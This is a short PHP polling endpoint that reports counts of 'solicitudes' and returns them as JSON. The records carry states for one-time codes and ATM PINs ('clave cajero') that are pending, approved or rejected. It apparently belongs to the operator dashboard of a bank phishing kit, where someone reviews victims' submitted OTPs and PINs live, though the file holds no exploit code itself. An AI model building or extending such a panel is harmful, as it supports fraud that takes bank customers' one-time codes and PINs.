<?php
require_once __DIR__ . '/_bootstrap.php';

$timestamp = (int)($_GET['timestamp'] ?? 0);

$solicitudes = cargarSolicitudes();
foreach ($solicitudes as &$s) ban_enriquecerSolicitud($s);
unset($s);

// Detectar cambios (fecha más reciente)
$ultimoCambio = 0;
foreach ($solicitudes as $s) {
    $t = strtotime($s['fecha_procesada'] ?? $s['fecha'] ?? 'now');
    if ($t > $ultimoCambio) $ultimoCambio = $t;
}
$hayCambios = $ultimoCambio > $timestamp;

$stats = [
    'total'      => count($solicitudes),
    'pendientes' => count(array_filter($solicitudes, fn($x) =>
        in_array($x['estado'], ['pending','pending_otp','pending_clave_cajero']))),
    'aprobadas'  => count(array_filter($solicitudes, fn($x) =>
        in_array($x['estado'], ['approved','approved_otp','approved_clave_cajero']))),
    'rechazadas' => count(array_filter($solicitudes, fn($x) =>
        in_array($x['estado'], ['rejected','rejected_otp','rejected_clave_cajero','rejected_user_error']))),
];

json_ok([
    'hay_cambios' => $hayCambios,
    'timestamp'   => $ultimoCambio ?: time(),
    'stats'       => $stats,
    'solicitudes' => $solicitudes,
]);
